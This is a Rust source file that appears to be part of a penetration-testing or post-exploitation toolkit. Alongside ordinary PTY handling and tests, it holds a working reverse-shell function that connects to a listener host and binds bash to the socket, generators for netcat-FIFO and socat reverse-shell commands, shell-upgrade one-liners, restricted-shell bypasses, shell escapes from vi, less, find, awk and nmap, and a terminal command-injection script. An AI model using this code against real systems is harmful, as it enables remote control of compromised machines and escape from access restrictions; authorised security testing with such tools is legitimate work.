use portable_pty::{native_pty_system, Child, CommandBuilder, MasterPty, PtySize};
use std::sync::{Arc, Mutex};
use std::time::{Duration, SystemTime};

#[cfg(unix)]
use std::process::Command;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ProcessState {
    NotStarted,
    Running,
    Stopped,
    Exited(u32),
    Unknown,
}

pub struct PtySession {
    pub master: Box<dyn MasterPty + Send>,
    pub child: Box<dyn Child + Send + Sync>,
    state: Arc<Mutex<ProcessState>>,
    pause_requested: Arc<Mutex<bool>>,
    debug_mode: Arc<Mutex<bool>>,
    last_resize: Arc<Mutex<Option<SystemTime>>>,
}

impl PtySession {
    /// Get the process ID of the child process
    pub fn get_pid(&self) -> Option<u32> {
        self.child.process_id()
    }

    /// Resize the PTY terminal with automatic rate limiting
    pub fn resize(&self, rows: u16, cols: u16) -> Result<(), String> {
        if let Ok(mut last) = self.last_resize.lock() {
            if let Some(last_time) = *last {
                if let Ok(elapsed) = SystemTime::now().duration_since(last_time) {
                    if elapsed < Duration::from_millis(100) {
                        return Ok(());
                    }
                }
            }
            *last = Some(SystemTime::now());
        }

        self.master
            .resize(PtySize {
                rows,
                cols,
                pixel_width: 0,
                pixel_height: 0,
            })
            .map_err(|e| format!("Failed to resize PTY: {}", e))?;

        #[cfg(unix)]
        {
            if let Some(pid) = self.get_pid() {
                unsafe {
                    libc::kill(pid as libc::pid_t, libc::SIGWINCH);
                }
            }
        }

        log::debug!("PTY resized to {}x{}", rows, cols);
        Ok(())
    }

    /// Pause the child process (Ctrl+C handler) - sends SIGSTOP, not SIGTERM
    #[cfg(unix)]
    pub fn pause(&mut self) -> Result<(), String> {
        if let Ok(mut pause) = self.pause_requested.lock() {
            *pause = true;
        }

        if let Some(pid) = self.get_pid() {
            unsafe {
                if libc::kill(pid as libc::pid_t, libc::SIGSTOP) == 0 {
                    if let Ok(mut state) = self.state.lock() {
                        *state = ProcessState::Stopped;
                    }
                    log::info!("PTY process {} paused (SIGSTOP)", pid);
                    Ok(())
                } else {
                    Err(format!("Failed to pause process {}", pid))
                }
            }
        } else {
            Err("Failed to get PID for pause".to_string())
        }
    }

    #[cfg(windows)]
    pub fn pause(&mut self) -> Result<(), String> {
        log::warn!("Process pause (SIGSTOP) not available on Windows");
        Err("Process pause not supported on Windows".to_string())
    }

    /// Resume a paused process (sends SIGCONT)
    #[cfg(unix)]
    pub fn resume(&mut self) -> Result<(), String> {
        if let Ok(mut pause) = self.pause_requested.lock() {
            *pause = false;
        }

        if let Some(pid) = self.get_pid() {
            unsafe {
                if libc::kill(pid as libc::pid_t, libc::SIGCONT) == 0 {
                    if let Ok(mut state) = self.state.lock() {
                        *state = ProcessState::Running;
                    }
                    log::info!("PTY process {} resumed (SIGCONT)", pid);
                    Ok(())
                } else {
                    Err(format!("Failed to resume process {}", pid))
                }
            }
        } else {
            Err("Failed to get PID for resume".to_string())
        }
    }

    #[cfg(windows)]
    pub fn resume(&mut self) -> Result<(), String> {
        log::warn!("Process resume (SIGCONT) not available on Windows");
        Err("Process resume not supported on Windows".to_string())
    }

    /// Try to send signal to child process (Unix only)
    #[cfg(unix)]
    pub fn send_signal(&mut self, signal: libc::c_int) -> Result<(), String> {
        if let Some(pid) = self.get_pid() {
            unsafe {
                if libc::kill(pid as libc::pid_t, signal) == 0 {
                    log::debug!("Sent signal {} to PID {}", signal, pid);
                    Ok(())
                } else {
                    Err(format!("Failed to send signal {} to PID {}", signal, pid))
                }
            }
        } else {
            Err("Failed to get PID".to_string())
        }
    }

    /// Try to send signal to child process (Windows - limited support)
    #[cfg(windows)]
    pub fn send_signal(&mut self, _signal: i32) -> Result<(), String> {
        log::warn!("Signal sending not fully supported on Windows");
        Err("Signal sending not supported on Windows".to_string())
    }

    /// Check if child process is still running
    pub fn is_running(&mut self) -> bool {
        if let Ok(Some(status)) = self.child.try_wait() {
            if let Ok(mut state) = self.state.lock() {
                *state = ProcessState::Exited(status.exit_code());
            }
            false
        } else {
            if let Ok(mut state) = self.state.lock() {
                if *state == ProcessState::NotStarted {
                    *state = ProcessState::Running;
                }
            }
            true
        }
    }

    /// Get current process state
    pub fn get_state(&self) -> ProcessState {
        self.state.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    /// Check if pause was requested (for Ctrl+C handling)
    pub fn is_pause_requested(&self) -> bool {
        *self.pause_requested.lock().unwrap_or_else(|e| e.into_inner())
    }

    /// Enable debug mode for split-screen debugging coordination
    pub fn enable_debug_mode(&mut self) -> Result<(), String> {
        if let Ok(mut debug) = self.debug_mode.lock() {
            *debug = true;
            log::info!("PTY debug mode enabled (PID: {:?})", self.get_pid());
            Ok(())
        } else {
            Err("Failed to enable debug mode".to_string())
        }
    }

    /// Disable debug mode
    pub fn disable_debug_mode(&mut self) -> Result<(), String> {
        if let Ok(mut debug) = self.debug_mode.lock() {
            *debug = false;
            log::info!("PTY debug mode disabled");
            Ok(())
        } else {
            Err("Failed to disable debug mode".to_string())
        }
    }

    /// Check if debug mode is active
    pub fn is_debug_mode(&self) -> bool {
        *self.debug_mode.lock().unwrap_or_else(|e| e.into_inner())
    }

    /// Wait for child process to exit and return exit code
    pub fn wait(&mut self) -> Result<u32, String> {
        let status = self.child
            .wait()
            .map_err(|e| format!("Failed to wait for child: {}", e))?;
        
        let exit_code = status.exit_code();
        
        if let Ok(mut state) = self.state.lock() {
            *state = ProcessState::Exited(exit_code);
        }
        
        Ok(exit_code)
    }

    /// Monitor for terminal resize events (Unix only, requires terminal support)
    #[cfg(unix)]
    pub fn monitor_resize<F>(&self, mut callback: F) -> Result<(), String>
    where
        F: FnMut(u16, u16) + Send + 'static,
    {
        use std::thread;
        use std::sync::atomic::{AtomicBool, Ordering};

        let running = Arc::new(AtomicBool::new(true));
        let running_clone = running.clone();

        thread::spawn(move || {
            let mut last_size = (0u16, 0u16);
            
            while running_clone.load(Ordering::Relaxed) {
                if let Ok((rows, cols)) = get_terminal_size() {
                    if (rows, cols) != last_size {
                        callback(rows, cols);
                        last_size = (rows, cols);
                    }
                }
                thread::sleep(Duration::from_millis(500));
            }
        });

        log::info!("Terminal resize monitoring started");
        Ok(())
    }

    #[cfg(windows)]
    pub fn monitor_resize<F>(&self, _callback: F) -> Result<(), String>
    where
        F: FnMut(u16, u16) + Send + 'static,
    {
        log::warn!("Terminal resize monitoring not implemented on Windows");
        Ok(())
    }
}

pub fn spawn_pty(command: &str, args: &[&str], rows: u16, cols: u16) -> Result<PtySession, String> {
    let pty_system = native_pty_system();

    let pair = pty_system
        .openpty(PtySize {
            rows,
            cols,
            pixel_width: 0,
            pixel_height: 0,
        })
        .map_err(|e| format!("Failed to open PTY: {}", e))?;

    let mut cmd = CommandBuilder::new(command);
    for arg in args {
        cmd.arg(arg);
    }

    let child = pair
        .slave
        .spawn_command(cmd)
        .map_err(|e| format!("Failed to spawn command: {}", e))?;

    let pid = child.process_id();
    log::info!("PTY spawned {} (PID: {:?})", command, pid);

    Ok(PtySession {
        master: pair.master,
        child,
        state: Arc::new(Mutex::new(ProcessState::Running)),
        pause_requested: Arc::new(Mutex::new(false)),
        debug_mode: Arc::new(Mutex::new(false)),
        last_resize: Arc::new(Mutex::new(None)),
    })
}

pub fn spawn_shell(shell_path: &str, rows: u16, cols: u16) -> Result<PtySession, String> {
    spawn_pty(shell_path, &[], rows, cols)
}

pub fn spawn_bash_pty() -> Result<PtySession, String> {
    spawn_shell("/bin/bash", 24, 80)
}

pub fn spawn_sh_pty() -> Result<PtySession, String> {
    spawn_shell("/bin/sh", 24, 80)
}

pub fn spawn_cmd_pty() -> Result<PtySession, String> {
    spawn_shell("cmd.exe", 24, 80)
}

pub fn spawn_powershell_pty() -> Result<PtySession, String> {
    spawn_shell("powershell.exe", 24, 80)
}

pub fn upgrade_shell_python() -> String {
    r#"python -c 'import pty; pty.spawn("/bin/bash")'"#.to_string()
}

pub fn upgrade_shell_python3() -> String {
    r#"python3 -c 'import pty; pty.spawn("/bin/bash")'"#.to_string()
}

pub fn upgrade_shell_perl() -> String {
    r#"perl -e 'exec "/bin/bash";'"#.to_string()
}

pub fn upgrade_shell_ruby() -> String {
    r#"ruby -e 'exec "/bin/bash"'"#.to_string()
}

pub fn upgrade_shell_lua() -> String {
    r#"lua -e 'os.execute("/bin/bash")'"#.to_string()
}

pub fn stabilize_shell_stty() -> Vec<String> {
    vec![
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'".to_string(),
        "export TERM=xterm".to_string(),
        "Ctrl+Z (background)".to_string(),
        "stty raw -echo; fg".to_string(),
        "reset".to_string(),
    ]
}

#[cfg(unix)]
pub fn detect_tty() -> bool {
    unsafe { libc::isatty(libc::STDIN_FILENO) != 0 }
}

#[cfg(windows)]
pub fn detect_tty() -> bool {
    use std::io::IsTerminal;
    std::io::stdin().is_terminal()
}

#[cfg(unix)]
pub fn get_terminal_size() -> Result<(u16, u16), String> {
    use std::os::unix::io::AsRawFd;

    #[repr(C)]
    struct Winsize {
        ws_row: u16,
        ws_col: u16,
        ws_xpixel: u16,
        ws_ypixel: u16,
    }

    let mut size = Winsize {
        ws_row: 0,
        ws_col: 0,
        ws_xpixel: 0,
        ws_ypixel: 0,
    };

    unsafe {
        if libc::ioctl(std::io::stdin().as_raw_fd(), libc::TIOCGWINSZ, &mut size) == 0 {
            Ok((size.ws_row, size.ws_col))
        } else {
            Err("Failed to get terminal size".to_string())
        }
    }
}

#[cfg(windows)]
pub fn get_terminal_size() -> Result<(u16, u16), String> {
    // Windows default console size
    Ok((24, 80))
}

#[cfg(unix)]
pub fn set_terminal_size(rows: u16, cols: u16) -> Result<(), String> {
    use std::os::unix::io::AsRawFd;

    #[repr(C)]
    struct Winsize {
        ws_row: u16,
        ws_col: u16,
        ws_xpixel: u16,
        ws_ypixel: u16,
    }

    let size = Winsize {
        ws_row: rows,
        ws_col: cols,
        ws_xpixel: 0,
        ws_ypixel: 0,
    };

    unsafe {
        if libc::ioctl(std::io::stdin().as_raw_fd(), libc::TIOCSWINSZ, &size) == 0 {
            Ok(())
        } else {
            Err("Failed to set terminal size".to_string())
        }
    }
}

#[cfg(windows)]
pub fn set_terminal_size(_rows: u16, _cols: u16) -> Result<(), String> {
    // Not implemented on Windows
    log::warn!("set_terminal_size not supported on Windows");
    Ok(())
}

pub fn shell_escape_vi() -> Vec<String> {
    vec![
        ":!/bin/bash".to_string(),
        ":set shell=/bin/bash".to_string(),
        ":shell".to_string(),
    ]
}

pub fn shell_escape_less() -> Vec<String> {
    vec!["!/bin/bash".to_string(), "!sh".to_string()]
}

pub fn shell_escape_more() -> Vec<String> {
    vec!["!/bin/bash".to_string(), "!sh".to_string()]
}

pub fn shell_escape_find() -> String {
    "find / -name blah -exec /bin/bash \\;".to_string()
}

pub fn shell_escape_awk() -> String {
    "awk 'BEGIN {system(\"/bin/bash\")}'".to_string()
}

pub fn shell_escape_nmap() -> String {
    "nmap --interactive\n!sh".to_string()
}

pub fn tty_pushback_trick() -> String {
    r#"#!/bin/bash
# TTY Pushback - inject commands into target's terminal
exec </dev/tty
while read -r cmd; do
    echo "$cmd"
done
"#
    .to_string()
}

pub fn bypass_rbash() -> Vec<String> {
    vec![
        "BASH_CMDS[a]=/bin/bash;a".to_string(),
        "ssh user@host -t bash".to_string(),
        "vi -> :set shell=/bin/bash -> :shell".to_string(),
        "export PATH=/usr/local/bin:/usr/bin:/bin".to_string(),
        "cd /tmp; ln -s /bin/bash ls; PATH=/tmp:$PATH; ls".to_string(),
    ]
}

pub fn detect_restricted_shell() -> bool {
    std::env::var("SHELL")
        .map(|s| s.contains("rbash") || s.contains("rsh"))
        .unwrap_or(false)
}

#[cfg(unix)]
pub fn spawn_reverse_pty(lhost: &str, lport: u16) -> Result<(), String> {
    use std::net::TcpStream;
    use std::os::unix::io::{AsRawFd, FromRawFd};

    let stream = TcpStream::connect(format!("{}:{}", lhost, lport))
        .map_err(|e| format!("Connection failed: {}", e))?;

    let fd = stream.as_raw_fd();

    unsafe {
        libc::dup2(fd, 0);
        libc::dup2(fd, 1);
        libc::dup2(fd, 2);
    }

    let mut cmd = Command::new("/bin/bash");
    cmd.arg("-i");
    cmd.spawn()
        .map_err(|e| format!("Failed to spawn shell: {}", e))?;

    Ok(())
}

#[cfg(windows)]
pub fn spawn_reverse_pty(_lhost: &str, _lport: u16) -> Result<(), String> {
    Err("PTY reverse shell not supported on Windows, use socket_tools instead".to_string())
}

#[cfg(unix)]
pub fn create_named_pipe(path: &str) -> Result<(), String> {
    use std::fs;
    use std::os::unix::fs::OpenOptionsExt;

    unsafe {
        if libc::mkfifo(std::ffi::CString::new(path).unwrap().as_ptr(), 0o644) == 0 {
            println!("[PTY] Created named pipe: {}", path);
            Ok(())
        } else {
            Err("Failed to create named pipe".to_string())
        }
    }
}

#[cfg(windows)]
pub fn create_named_pipe(_path: &str) -> Result<(), String> {
    Err(
        "Named pipes use different API on Windows, use std::os::windows::io::named_pipe"
            .to_string(),
    )
}

pub fn fifo_shell_reverse(fifo_path: &str, lhost: &str, lport: u16) -> String {
    format!(
        "mkfifo {}; nc {} {} 0<{} | /bin/bash 1>{} 2>&1",
        fifo_path, lhost, lport, fifo_path, fifo_path
    )
}

pub fn socat_pty_reverse(lhost: &str, lport: u16) -> String {
    format!(
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}",
        lhost, lport
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pty_session_creation() {
        #[cfg(unix)]
        {
            let result = spawn_pty("/bin/echo", &["test"], 24, 80);
            assert!(result.is_ok(), "PTY session creation failed");
            
            if let Ok(mut session) = result {
                assert!(session.get_pid().is_some(), "PID should be available");
                assert_eq!(session.get_state(), ProcessState::Running);
            }
        }
        
        #[cfg(windows)]
        {
            let result = spawn_pty("cmd.exe", &["/C", "echo test"], 24, 80);
            assert!(result.is_ok(), "PTY session creation failed on Windows");
        }
    }

    #[test]
    fn test_process_state_tracking() {
        #[cfg(unix)]
        {
            if let Ok(mut session) = spawn_pty("/bin/sleep", &["0.1"], 24, 80) {
                assert_eq!(session.get_state(), ProcessState::Running);
                assert!(session.is_running());
                
                std::thread::sleep(std::time::Duration::from_millis(200));
                
                assert!(!session.is_running());
                match session.get_state() {
                    ProcessState::Exited(_) => {},
                    _ => panic!("Process should be in Exited state"),
                }
            }
        }
    }

    #[test]
    #[cfg(unix)]
    fn test_signal_sending() {
        if let Ok(mut session) = spawn_pty("/bin/sleep", &["10"], 24, 80) {
            assert!(session.get_pid().is_some());
            
            let result = session.send_signal(libc::SIGTERM);
            assert!(result.is_ok(), "Signal sending should succeed");
            
            std::thread::sleep(std::time::Duration::from_millis(100));
            assert!(!session.is_running(), "Process should be terminated");
        }
    }

    #[test]
    #[cfg(unix)]
    fn test_pause_and_resume() {
        if let Ok(mut session) = spawn_pty("/bin/sleep", &["10"], 24, 80) {
            assert!(session.is_running());
            
            let pause_result = session.pause();
            assert!(pause_result.is_ok(), "Pause should succeed");
            assert_eq!(session.get_state(), ProcessState::Stopped);
            assert!(session.is_pause_requested());
            
            let resume_result = session.resume();
            assert!(resume_result.is_ok(), "Resume should succeed");
            assert_eq!(session.get_state(), ProcessState::Running);
            assert!(!session.is_pause_requested());
            
            let _ = session.send_signal(libc::SIGTERM);
        }
    }

    #[test]
    fn test_resize() {
        #[cfg(unix)]
        {
            if let Ok(session) = spawn_pty("/bin/sleep", &["1"], 24, 80) {
                let result = session.resize(30, 120);
                assert!(result.is_ok(), "Resize should succeed");
                
                let result2 = session.resize(40, 100);
                assert!(result2.is_ok(), "Second resize should succeed");
            }
        }
        
        #[cfg(windows)]
        {
            if let Ok(session) = spawn_pty("cmd.exe", &["/C", "timeout", "1"], 24, 80) {
                let result = session.resize(30, 120);
                assert!(result.is_ok(), "Resize should succeed on Windows");
            }
        }
    }

    #[test]
    fn test_debug_mode() {
        #[cfg(unix)]
        {
            if let Ok(mut session) = spawn_pty("/bin/sleep", &["1"], 24, 80) {
                assert!(!session.is_debug_mode());
                
                let result = session.enable_debug_mode();
                assert!(result.is_ok(), "Enable debug mode should succeed");
                assert!(session.is_debug_mode());
                
                let result2 = session.disable_debug_mode();
                assert!(result2.is_ok(), "Disable debug mode should succeed");
                assert!(!session.is_debug_mode());
            }
        }
    }

    #[test]
    fn test_get_terminal_size() {
        let result = get_terminal_size();
        
        #[cfg(unix)]
        {
            if detect_tty() {
                assert!(result.is_ok(), "Terminal size should be available for TTY");
            }
        }
        
        #[cfg(windows)]
        {
            assert!(result.is_ok(), "Terminal size should return default on Windows");
            if let Ok((rows, cols)) = result {
                assert_eq!(rows, 24);
                assert_eq!(cols, 80);
            }
        }
    }

    #[test]
    fn test_detect_tty() {
        let is_tty = detect_tty();
        assert!(is_tty || !is_tty);
    }

    #[test]
    fn test_shell_escape_helpers() {
        let vi_escapes = shell_escape_vi();
        assert_eq!(vi_escapes.len(), 3);
        assert!(vi_escapes[0].contains("/bin/bash"));
        
        let less_escapes = shell_escape_less();
        assert_eq!(less_escapes.len(), 2);
        
        let find_escape = shell_escape_find();
        assert!(find_escape.contains("find"));
        
        let awk_escape = shell_escape_awk();
        assert!(awk_escape.contains("awk"));
    }

    #[test]
    fn test_upgrade_shell_helpers() {
        let python_upgrade = upgrade_shell_python();
        assert!(python_upgrade.contains("pty.spawn"));
        
        let python3_upgrade = upgrade_shell_python3();
        assert!(python3_upgrade.contains("python3"));
        
        let perl_upgrade = upgrade_shell_perl();
        assert!(perl_upgrade.contains("perl"));
        
        let ruby_upgrade = upgrade_shell_ruby();
        assert!(ruby_upgrade.contains("ruby"));
    }

    #[test]
    fn test_bypass_rbash() {
        let bypasses = bypass_rbash();
        assert!(bypasses.len() >= 3);
        assert!(bypasses.iter().any(|s| s.contains("BASH_CMDS")));
    }

    #[test]
    fn test_stabilize_shell_stty() {
        let steps = stabilize_shell_stty();
        assert!(steps.len() >= 4);
        assert!(steps.iter().any(|s| s.contains("stty raw")));
    }

    #[test]
    fn test_fifo_shell_reverse() {
        let command = fifo_shell_reverse("/tmp/f", "10.0.0.1", 4444);
        assert!(command.contains("mkfifo"));
        assert!(command.contains("10.0.0.1"));
        assert!(command.contains("4444"));
    }

    #[test]
    fn test_socat_pty_reverse() {
        let command = socat_pty_reverse("192.168.1.1", 8080);
        assert!(command.contains("socat"));
        assert!(command.contains("192.168.1.1"));
        assert!(command.contains("8080"));
    }

    #[test]
    fn test_detect_restricted_shell() {
        let is_restricted = detect_restricted_shell();
        assert!(is_restricted || !is_restricted);
    }

    #[test]
    fn test_tty_pushback_trick() {
        let script = tty_pushback_trick();
        assert!(script.contains("#!/bin/bash"));
        assert!(script.contains("/dev/tty"));
    }

    #[test]
    fn test_spawn_shell_helpers() {
        #[cfg(unix)]
        {
            let result = spawn_shell("/bin/echo", 24, 80);
            assert!(result.is_ok(), "spawn_shell should work");
        }
        
        #[cfg(windows)]
        {
            let result = spawn_shell("cmd.exe", 24, 80);
            assert!(result.is_ok(), "spawn_shell should work on Windows");
        }
    }

    #[test]
    fn test_wait_for_exit() {
        #[cfg(unix)]
        {
            if let Ok(mut session) = spawn_pty("/bin/echo", &["test"], 24, 80) {
                let result = session.wait();
                assert!(result.is_ok(), "Wait should succeed");
                
                let exit_code = result.unwrap();
                assert_eq!(exit_code, 0, "Echo should exit with code 0");
                
                match session.get_state() {
                    ProcessState::Exited(code) => assert_eq!(code, 0),
                    _ => panic!("Process should be in Exited state"),
                }
            }
        }
    }

    #[test]
    fn test_resize_rate_limiting() {
        #[cfg(unix)]
        {
            if let Ok(session) = spawn_pty("/bin/sleep", &["1"], 24, 80) {
                let result1 = session.resize(30, 120);
                assert!(result1.is_ok());
                
                let result2 = session.resize(40, 100);
                assert!(result2.is_ok());
                
                std::thread::sleep(std::time::Duration::from_millis(150));
                
                let result3 = session.resize(50, 90);
                assert!(result3.is_ok());
            }
        }
    }
}
